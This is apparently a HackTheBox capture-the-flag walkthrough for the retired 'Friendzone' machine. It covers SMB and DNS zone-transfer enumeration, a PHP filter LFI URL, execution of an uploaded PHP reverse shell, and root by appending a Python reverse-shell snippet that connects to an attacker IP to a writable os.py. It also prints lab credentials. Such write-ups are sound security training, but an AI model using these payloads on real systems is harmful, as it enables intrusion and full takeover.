---
title: Friendzone - HackTheBox Walkthrough
author: Degr4ne
date: 2021-11-05 12:00:00 
categories: [HackTheBox,Linux]
tags: [zone tranfer,lfi,pspy,library hijacking]
math: false
mermaid: false
image:
  src: /assets/img/HTB/Friendzone/00-banner.png
  width: 596
  height: 373
---
Hello guys, welcome back with another walkthrough, this time we'll be doing`Friendzone` a retired linux machine from HackTheBox rated easy. Without further ado, let’s begin.
# Recon
## Nmap Scan
As always we’ll start with a nmap scan to discover the open ports and services.
```console
$ cat nmap-scan 
# Nmap 7.91 scan initiated Fri Oct 29 15:10:34 2021 as: nmap -sC -sV -v -oN nmap-scan 10.129.1.225
Nmap scan report for 10.129.1.225
Host is up (0.12s latency).
Not shown: 993 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-10-05T21:02:30
| Not valid after:  2018-11-04T21:02:30
| MD5:   c144 1868 5e8b 468d fc7d 888b 1123 781c
|_SHA-1: 88d2 e8ee 1c2c dbd3 ea55 2e5e cdd4 e94c 4c8b 9233
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s
| nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FRIENDZONE<00>       Flags: <unique><active>
|   FRIENDZONE<03>       Flags: <unique><active>
|   FRIENDZONE<20>       Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2021-10-29T22:11:13+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-29T20:11:13
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 29 15:11:23 2021 -- 1 IP address (1 host up) scanned in 49.71 seconds
```
There seven ports open: `21:FTP`, `22:SSH`, `55:Domain`, `139,445:SMB`, `80:HTTP` and `443:HTTPS`.

## FTP Enumeration
As we saw in the nmap results FTP doesn't allow anonymous loggin.

![01-ftp](/assets/img/HTB/Friendzone/01-ftp.png)

Therefore, let's enumerate the next port.

## DNS
I couldn't get any domain name using `nslookup` 

![02-nslookup](/assets/img/HTB/Friendzone/02-nslookup.png)

## Smb Enumeration
Use `crackmapexec` to list files and its permissions from the samba share folder.

![03-cme](/assets/img/HTB/Friendzone/03-cme.png)

We can upload files into `Development` directory and read the content of `general`, also there's a comment that discloses the full path of all this files `/etc/*`.

![04-smbclient](/assets/img/HTB/Friendzone/04-smbclient.png)

Inside `general`, the content of `creds.txt` reveals admin's password.

User|Password
-|-
admin|WORKWORKHhallelujah@#

I tried use this creadential to loggin into SSH or FTP but it didn't work.

## HTTP Enumeration
The website doesn't show much information except for a possible domain `friendzoneportal.red`

![05-web](/assets/img/HTB/Friendzone/05-web.png)

And `gobuster` only finds `/wordpress` which is an empty directory.

![06-web](/assets/img/HTB/Friendzone/06-web.png)

Till now we obtained 2 possible domains `friendzone.red` and `friendzoneportal.red`, one got it from nmap scan and the other from the website.
Let’s try a zone transfer on both domains.

```console
$ dig @10.129.1.225 axfr friendzone.red > zonetransfer.txt      
$ dig @10.129.1.225 axfr friendzoneportal.red >> zonetransfer.txt
$ cat zonetransfer.txt | awk '{print $1}' | grep red | sed 's/.$//g'| sort -u | uniq | sed 's/\\\n/ /g'
```

Add all the subdomains into `/etc/hosts` to start enumerating them.

```plaintext
10.129.1.225 friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red friendzoneportal.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red
```

## HTTPS Enumeration
### administrator1.friendzone.red
The first subdomain is a login form when we can use the admin's credentials.

![07-web](/assets/img/HTB/Friendzone/07-web.png)

Visit `dashboard.php` and it gives us some arguments to view an image `image_id=a.jpg&pagename=timestamp`.

![08-web](/assets/img/HTB/Friendzone/08-web.png)

This displays a image and a timestamp numbers, might be vulnerable to LFI.

![09-web](/assets/img/HTB/Friendzone/09-web.png)

# Initial Foothold

See the content of `dashboard.php` using the next [LFI Wrapper](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi--rfi-using-wrappers) and decrypt it using `base64`.
```plaintext
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=dashboard
```
![10-php](/assets/img/HTB/Friendzone/10-php.png)

The script appends `.php` to pagename argument and then it's executed.

Reminding that we have write permissions into `Development` directory from samba share folder, just need to upload a php reverse shell into it with the `put` command and then execute it from the website using the next URL:

```plaintext
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell
```

We got the reverse shell.

![11-nc](/assets/img/HTB/Friendzone/11-nc.png)

Now spawn a TTY Shell

```console
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ ^Z
$ stty raw -echo;fg
$ reset
$ export TERM=xterm
$ export SHELL=bash
```
In `/var/www`, we see `mysql_data.conf` file containing credentials for user `friend`.

![12-creds](/assets/img/HTB/Friendzone/12-creds.png)

User | Password
-|-
friend|Agpyu12!0.213$

# Privilage Escalation

I didn't find any SUID file or sudoers file but there was a interesting python script in `/opt/server_admin` named `reporter.py` to be sure that this file was a  root's cronjob, transfer [pspy64](https://github.com/DominicBreuker/pspy/releases) to victim machine using a Python HTTP Server and run it.

![13-pspy](/assets/img/HTB/Friendzone/13-pspy.png)

Ok, root is executing this file every two minutes.
## Python Library Hijacking
The script is using `os` library.
```py
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address
#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
#os.system(command)
# I need to edit the script later
# Sam ~ python developer
```

![14-os](/assets/img/HTB/Friendzone/14-os.png)

And we have write access to `os.py` this means we can insert a reverse shell at the end of the file and it will be executed when the `os` module is imported.

```py
import socket,subprocess,os  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); 
s.connect(("10.10.14.89",443)) 
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);
```

Set up a netcat listener port on 443 and we got root!!

![15-root](/assets/img/HTB/Friendzone/15-root.png)

That’s it for now guys. Until next time.

# Resource

Topic|URL
-|-
Python Library Hijacking|[https://medium.com/analytics-vidhya/python-library-hijacking-on-linux](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)
